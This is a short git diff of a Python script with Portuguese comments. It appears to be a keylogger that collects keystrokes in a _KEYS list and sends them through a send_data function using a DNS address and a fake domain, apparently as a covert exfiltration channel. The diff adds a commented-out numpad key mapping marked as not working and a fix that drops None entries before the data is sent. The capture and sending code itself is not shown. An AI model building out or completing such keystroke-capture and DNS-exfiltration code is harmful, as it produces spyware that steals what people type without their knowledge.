@@ -19,6 +19,19 @@ _FAKE_DOMAIN = '.example.com'
 _KEYS = []
 _USR_HAS = None
 
+# NUMPAD_KEYS = { -------------------------- NÃO FUNCIONANDO
+#     keyboard.KeyCode.from_vk(98): '0',
+#     keyboard.KeyCode.from_vk(89): '1',
+#     keyboard.KeyCode.from_vk(90): '2',
+#     keyboard.KeyCode.from_vk(91): '3',
+#     keyboard.KeyCode.from_vk(92): '4',
+#     keyboard.KeyCode.from_vk(93): '5',
+#     keyboard.KeyCode.from_vk(94): '6',
+#     keyboard.KeyCode.from_vk(95): '7',
+#     keyboard.KeyCode.from_vk(96): '8',
+#     keyboard.KeyCode.from_vk(97): '9'
+# }
+
 ###############################################################
 # Classes e Funções
 ###############################################################
@@ -45,6 +58,9 @@ def send_data(data):
         None    
     '''
     global _DNS_ADDR, _FAKE_DOMAIN
+
+    # Remove entradas None da lista - Unico metodo ate agora que funcionou para nao crashar
+    data = [entry for entry in data if entry is not None]
 
     print('vou enviar algo')
 
